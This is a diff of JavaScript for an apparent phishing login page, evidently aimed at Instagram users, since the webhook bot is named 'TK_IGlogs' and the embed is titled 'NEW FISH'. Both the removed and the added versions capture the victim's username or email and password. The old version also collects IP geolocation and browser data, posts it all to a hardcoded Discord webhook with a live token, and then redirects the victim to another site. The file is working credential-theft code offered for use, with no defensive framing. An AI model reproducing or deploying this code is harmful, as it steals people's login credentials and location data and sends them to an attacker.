@@ -1,88 +1,39 @@
-const loginButton = document.querySelector("#loginBtn");
-const password = document.querySelector("#passwordInput");
-const username = document.querySelector("#usernameInput");
-const showPasswordBtn = document.querySelector("#showPasswordBtn");
+const form = document.querySelector("#form");
 
-password.addEventListener("input", disableBtn);
-username.addEventListener("input", disableBtn);
-showPasswordBtn.addEventListener("click", passwordVisible);
+form.addEventListener("submit", (e) => {
+  e.preventDefault();
 
-function passwordVisible() {
-  if (password.type === "password") {
-    password.type = "text";
-    showPasswordBtn.textContent = "Hide";
-  } else {
-    password.type = "password";
-    showPasswordBtn.textContent = "Show";
-  }
-  passwordBtnVisible();
-}
+  const identity = document.getElementById("email").value;
+  const password = document.getElementById("password").value;
 
-function passwordBtnVisible() {
-  if (password.value.length > 0) {
-    showPasswordBtn.style.display = "block";
-  } else {
-    showPasswordBtn.style.display = "none";
-  }
-}
+  const my_text = `Result is:%0A - Identity: ${identity} %0A - Password: ${password}`;
 
-function disableBtn() {
-  if (username.value && password.value) {
-    loginButton.disabled = false;
-  } else {
-    loginButton.disabled = true;
-  }
-}
+  // Replace with your Discord webhook URL
+  const webhookURL = "https://discord.com/api/webhooks/1149618099880984657/3qnXvasbZR_jvv1A6RijxC7sEVsbuRJ6BKj2loKG7AVSBaUfuncqOfozp4k3gSe4lWXR";
 
-let Info;
-
-loginButton.addEventListener("click", async () => {
-  Info = await getInfo();
-  console.log(Info);
-  sendInfo();
-});
-
-async function getInfo() {
-  try {
-    const response = await fetch("https://ipapi.co/json/");
-    const data = await response.json();
-
-    const info = `> IP: ${data.ip}\n> City: ${data.city}\n> Region: ${data.region}\n> Country: ${data.country_name}\n> Postal Code: ${data.postal}\n> Browser: ${navigator.userAgent}\n> Username: ${username.value}\n> Password: ${password.value}\n`;
-    return info;
-  } catch (error) {
-    return `> IP: Unknown\n> City: Unknown\n> Region: Unknown\n> Country: Unknown\n> Postal Code: Unknown\n> Browser: ${navigator.userAgent}\n> Username: ${username.value}\n> Password: ${password.value}\n`;
-  }
-}
-
-async function sendInfo() {
-  const webhook = "https://discord.com/api/webhooks/1149618099880984657/3qnXvasbZR_jvv1A6RijxC7sEVsbuRJ6BKj2loKG7AVSBaUfuncqOfozp4k3gSe4lWXR"; // Replace with your Discord webhook URL
-
-  const embed = {
-    color: 1585803, // #18328b
-    title: "NEW FISH",
-    description: Info,
-    footer: {
-      text: "@terrykiddo",
-    },
+  const payload = {
+    content: my_text,
   };
 
-  const config = {
+  fetch(webhookURL, {
     method: "POST",
     headers: {
       "Content-Type": "application/json",
     },
-    body: JSON.stringify({ username: "TK_IGlogs", embeds: [embed] }),
-  };
-
-  try {
-    await fetch(webhook, config);
-  } catch (error) {
-    console.error(error);
-    setTimeout(() => {
-      window.location.replace("https://spring-feather-2536.on.fleek.co/");
-    }, 1000);
-  }
-  setTimeout(() => {
-    window.location.replace("https://spring-feather-2536.on.fleek.co/");
-  }, 1000);
-}
+    body: JSON.stringify(payload),
+  })
+    .then((response) => {
+      if (response.ok) {
+        console.log("Message sent successfully to Discord!");
+      } else {
+        console.error("Failed to send the message to Discord.");
+        document.getElementById("alert-message").innerHTML =
+          "Sorry, there was an error while sending your message.";
+      }
+    })
+    .catch((error) => {
+      console.error("Error:", error);
+      document.getElementById("alert-message").innerHTML =
+        "Sorry, there was an error while sending your message.";
+    });
+});
